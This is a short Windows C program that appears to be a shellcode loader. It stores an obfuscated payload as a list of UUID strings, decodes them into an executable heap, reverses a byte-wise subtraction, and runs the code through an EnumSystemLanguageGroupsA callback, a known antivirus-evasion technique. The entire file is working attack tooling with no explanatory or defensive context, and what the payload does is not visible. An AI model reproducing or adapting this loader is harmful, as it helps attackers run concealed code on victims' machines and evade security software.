#include <Windows.h>
#include <rpc.h>
#pragma comment(lib,"Rpcrt4.lib")

//¸Ã
const char * buf[] = {
	"17a6ff13-1717-a077-fc48-e97ba26947a2",
	"69a22369-262b-61ce-3da2-893f481648d7",
	"937853c3-4319-d837-e624-18de608c0669",
	"a22769a2-5359-186e-e7a2-578f9cd78b63",
	"a267e718-2f5f-6fa2-3718-ea9ce08b5348",
	"4ba26016-18a2-48ed-d7d8-e624c318de4f",
	"1a0b8cf7-0f94-9452-3b8c-f76fa26f3b18",
	"23a27dea-a262-336f-18ea-a21ba218e7a0",
	"723b3b5b-7872-7170-6816-f76f7671a229",
	"16169700-7416-4a7f-4917-177f8e8a4976",
	"8e637f6b-1e3d-ffa0-16e7-cfa718171740",
	"7f676bdb-9740-1782-16ec-81217fd7bf96",
	"17197f98-7328-fda0-6767-676757675767",
	"f626017f-16f7-aeec-8127-6d6e7fb0bc8b",
	"9cec1678-8bd7-1621-651f-8c03ff7e1717",
	"81178117-6d1b-7f6e-19f0-df7616ec9a0f",
	"a24d9517-814d-7f57-1727-17176d81177f",
	"fc6abb6f-ec16-6aaa-8117-6d6a6e7f19f0",
	"ec1676df-0f9a-9417-3f6f-7f1757171781",
	"227f6717-2646-1647-ec6e-7f8c85647816",
	"167575ec-3b23-9c26-8716-161600b21616",
	"40da1816-8cdd-dad8-d207-ccb96d81176a",
	"0017ec16-0000-0000-0000-000000000000",
};


int main(int argc, char* argv[]) {

	int dwNum = sizeof(buf) / sizeof(buf[0]);

	HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
	if (hMemory == NULL) {
		return -1;
	}
	PVOID pMemory = HeapAlloc(hMemory, 0, 1024);
	unsigned char* pMemory2;
	DWORD_PTR CodePtr = (DWORD_PTR)pMemory;

	for (size_t i = 0; i < dwNum; i++)
	{
		if (CodePtr == NULL) {
			break;
		}
		RPC_STATUS	status = UuidFromStringA((RPC_CSTR)buf[i], (UUID*)CodePtr);
		if (status != RPC_S_OK) {

			return -1;
		}
		CodePtr += 16;
	}

	if (pMemory == NULL) {
		return -1;
	}
	pMemory2 = pMemory;
	for (int i = 0; i < 0x163; i++){
		pMemory2[i] = pMemory2[i] - 0x17;
	}
	if (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, NULL) == FALSE) {
		return 0;
	}

	return 0;
}